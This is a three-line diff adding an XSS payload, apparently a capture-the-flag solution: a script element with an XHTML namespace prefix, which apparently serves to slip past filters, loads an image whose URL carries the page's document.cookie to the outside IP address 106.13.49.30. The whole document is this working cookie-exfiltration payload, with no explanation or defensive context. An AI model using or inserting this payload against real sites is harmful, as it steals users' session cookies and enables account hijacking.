@@ -1,0 +1,3 @@
+<a:script xmlns:a="http://www.w3.org/1999/xhtml">
+    (new Image()).src='http://106.13.49.30/flag?flag='+escape(document.cookie);
+</a:script>
